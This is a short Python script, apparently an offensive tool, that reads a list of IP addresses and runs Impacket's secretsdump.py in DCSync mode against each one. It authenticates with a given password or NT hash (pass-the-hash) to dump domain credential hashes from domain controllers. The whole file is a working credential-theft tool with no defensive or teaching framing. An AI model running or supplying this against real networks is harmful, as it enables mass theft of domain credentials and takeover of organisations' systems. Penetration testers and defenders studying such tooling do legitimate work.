#!/usr/bin/env python3
"""
dcsync_all.py — DCSync every IP in a text file.
Usage:
    python3 dcsync_all.py targets.txt --user Administrator --password 'P@ss' --domain corp.local
    python3 dcsync_all.py targets.txt --user Administrator --hash <NThash> --domain corp.local
"""
import argparse
import subprocess
import sys
from pathlib import Path


def main():
    p = argparse.ArgumentParser()
    p.add_argument("file", help="File with IPs (one per line)")
    p.add_argument("--user", required=True)
    p.add_argument("--password")
    p.add_argument("--hash")
    p.add_argument("--domain", default=".")
    args = p.parse_args()

    if not args.password and not args.hash:
        sys.exit("[!] Provide --password or --hash")

    targets = [l.strip() for l in Path(args.file).read_text().splitlines() if l.strip() and not l.startswith("#")]

    for ip in targets:
        if args.hash:
            h = args.hash if ":" in args.hash else f":{args.hash}"
            auth = f"{args.domain}/{args.user}@{ip}"
            cmd = ["secretsdump.py", auth, "-hashes", h, "-just-dc"]
        else:
            auth = f"{args.domain}/{args.user}:{args.password}@{ip}"
            cmd = ["secretsdump.py", auth, "-just-dc"]

        print(f"\n=== {ip} ===")
        subprocess.run(cmd)


if __name__ == "__main__":
    main()